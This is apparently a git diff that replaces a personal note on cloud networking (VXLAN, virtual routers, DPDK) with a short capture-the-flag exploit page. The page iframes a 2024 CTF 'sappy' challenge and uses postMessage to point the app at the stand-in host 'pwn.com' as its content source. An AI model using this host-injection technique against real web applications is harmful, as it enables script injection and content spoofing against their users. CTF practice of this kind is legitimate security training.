@@ -1,30 +1,19 @@
-I have been working for Huawei private cloud IaaS department since 2021. This is my note.
-</br></br>
----------------------</br>
-Key Terms:</br></br>
+<h1>pwn</h1>
+<iframe id="idframe" src="https://sappy-web.2024.ctfcompetition.com/sap.html" onload=onloadpwn() sandbox="allow-scripts"></iframe>
 
-There are clouds. There are some networks in a cloud. There are virtual machines (VM) that can bind their ports into the networks. VMs in the same network have layer 2 connection (packet switching), and VMs in different networks but the same VPC has layer 3 connection (routing).</br>
-</br>
-Manage Plane manages devices, such as virtual routers. Control plane manages how packets get transferred, such as flows. Data plane does actual packet transferring.</br>
-</br>
----------------------</br>
-How Do Virtual Machine packets get transferred?</br>
-</br>
-1. There are routes, macs, and IPs in every virtual machine. For every virtual port, there is a "tap" device on the physical host server. Packet comes out to the tap device.</br>
-2. The host server has virtual flows (e.g. OpenFlow) and bridges (e.g. OpenVSwitch bridges) to transfer packets. The bridges are designed with different responsibilities, such as access control, layer 2 switching, layer 3 routing, VXLAN packaging and depackaging.</br>
-3. According to the rules of flows (such as a match of source MAC, source IP, in port, VLAN, and custom registers), and the connection setup of bridges, data gets transferred. When a packet gets into a bridge, it starts to match the first table (table 0). It finds the first flow that matches with highest priority, and then gets resubmitted to another table according to the flow. Finally, the packet gets out of the bridges and gets sent out of the host server.</br>
-4. There is typically VXLAN packaging before a packet is transferred out of the host server. VXLAN makes the data in overlay easy and separated. You can have the VXLAN Network ID (VNI) match the virtual networks. When the target host server receives the packets, depackaging will happen, and the virtual machine itself doesn't know what happened outside.</br>
-5. There are usually switches connected to the host server. There can be routes, NQA/BFD, etc. NQA and BFD can be set up to detect connectivity, and disable the route when the end target is unreachable. We can balance the network traffic load by setting up 2 routes with an identical destination but different nexthop, so both can be selected.</br>
-6. A typical use of NQA/BFD is: when there are many identical virtual routers, and packets can get transferred on any one of them. There can be bridges and flows on the virtual routers.</br>
-</br>
----------------------</br>
-How, why, and best practices:</br>
-</br>
-1. Namespaces isolate network resources. Namespaces cannot reach each other by default. We can connect them by veth ports for example.</br>
-2. Manage Plane and control plane restarting (e.g. after upgrade) should not affect network traffic.</br>
-3. Virtual routers can be VMs. We can upgrade them one by one, and the traffic that was on the upgrading virtual router will be on others.</br>
-4. There should be a way to quickly prevent packets entering a specific virtual router. For example, the virtual router can drop all BFD requests, so the switch will no longer think the virtual router is reachable, and therefore stop sending to it.</br>
-5. For the virtual routers to elastically scale up or down, they can be VMs. The network traffic going into the host server can be VLAN, and VXLAN gets handled inside the virtual routers.</br>
-6. VXLAN vs VLAN. They are both logical networks. VXLAN network is overlay (virtual) while VLAN network is underlay (physical). VXLAN doesn't care about the underlay as long as it reaches. VXLAN uses UDP packets sent over tunnels. VXLAN has 24 bit identifiers (VNI) that supports 16 million domains. VLAN has 12 bit identifiers that support 4096 networks. With VXLAN, it is easy to migrate VMs as they can always have the same IPs.</br>
-7. Network resources from different tenants, and virtual private clouds should not interfere with each other. It can be achieved via namespaces, VLAN, VXLAN, virtual bridges and such.</br>
-8. Typically inside Linux, packets get transferred inside kernel space. This is sometimes time consuming. DPDK can use fast paths to bypass the kernel space, to eliminate context switching to kernel space. DPDK can have a poll mode driver instead of CPU interrupts. DPDK can have huge pages. DPDK can be NUMA aware to avoid expensive NUMA expenses.</br>
+<script>
+    let pwn_url = "https://pwn.com";
+    function onloadpwn() {
+        console.log('onloading...');
+        let iframe = document.getElementById('idframe');
+        iframe.contentWindow.postMessage(
+            JSON.stringify({"method": "initialize", "host": pwn_url}),
+            '*');
+        // iframe.contentWindow.postMessage({"method": "render", "host": pwn_url},'*');
+        const msg = JSON.stringify({
+          method: "render",
+          page: "no-lowercase",
+        });
+        iframe.contentWindow.postMessage(msg, '*');
+    }
+</script>
